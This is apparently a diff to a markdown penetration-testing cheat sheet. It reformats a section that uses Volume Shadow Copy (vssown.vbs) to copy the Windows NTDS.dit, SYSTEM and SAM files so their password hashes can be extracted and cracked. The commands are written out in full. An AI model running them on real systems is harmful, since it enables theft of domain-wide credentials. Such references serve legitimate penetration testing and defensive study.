@@ -35,15 +35,13 @@ If you can’t crack the hash of a local administrator account you can instead j
 
 ### Volume Shadow Copy Services to copy ntds.dit
 
-> `cscript vssown.vbs /start`
->
-> `cscript vssown.vbs /create`
->
-> `copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\NTDS\NTDS.dit c:\`
->
-> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SYSTEM c:\`
->
-> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SAM c:\`
+```
+cscript vssown.vbs /start
+cscript vssown.vbs /create
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\NTDS\NTDS.dit c:\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SYSTEM c:\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SAM c:\
+```
 
 ## Hash identification
 
